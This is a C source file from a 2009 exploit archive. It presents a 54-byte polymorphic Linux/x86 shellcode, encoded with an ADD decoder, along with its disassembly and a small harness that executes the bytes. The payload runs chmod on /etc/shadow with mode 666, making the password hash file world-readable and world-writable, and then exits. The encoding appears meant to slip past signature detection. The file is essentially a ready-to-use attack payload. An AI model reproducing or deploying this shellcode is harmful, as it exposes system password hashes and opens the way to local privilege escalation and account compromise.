/*
Title	: Linux/x86 - Shellcode Polymorphic chmod("/etc/shadow",666) & exit() - 54 bytes
Encode  : _ADD

Author	: Jonathan Salwan
Mail	: submit [!] shell-storm.org


! Database of shellcodes => http://www.shell-storm.org/shellcode/


Informations  _chmod() & _exit():
================================

	%eax = 15
   	%ebx = /etc/shadow
   	%ecx = 666

        %eax = 1
        %ebx = 0

Disassembly of section .text:

 08048054 <.text>:
 8048054:	51                   	push   %ecx
 8048055:	66 b9 b6 01          	mov    $0x1b6,%cx
 8048059:	68 61 64 6f 77       	push   $0x776f6461
 804805e:	68 63 2f 73 68       	push   $0x68732f63
 8048063:	68 2f 2f 65 74       	push   $0x74652f2f
 8048068:	89 e3                	mov    %esp,%ebx
 804806a:	6a 0f                	push   $0xf
 804806c:	58                   	pop    %eax
 804806d:	cd 80                	int    $0x80
 804806f:	40                   	inc    %eax
 8048070:	cd 80                	int    $0x80

*/


#include "stdio.h"

char shellcode[] = 	"\xeb\x11\x5e\x31\xc9\xb1\x30\x80"
			"\x6c\x0e\xff\x23\x80\xe9\x01\x75"
  			"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
			"\x74\x89\xdc\xd9\x24\x8b\x84\x87"
			"\x92\x9a\x8b\x86\x52\x96\x8b\x8b"
			"\x52\x52\x88\x97\xac\x06\x8d\x32"
			"\x7b\xf0\xa3\x63\xf0\xa3";

int main()
{
	printf("Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();

	return 0;
}

// milw0rm.com [2009-06-22]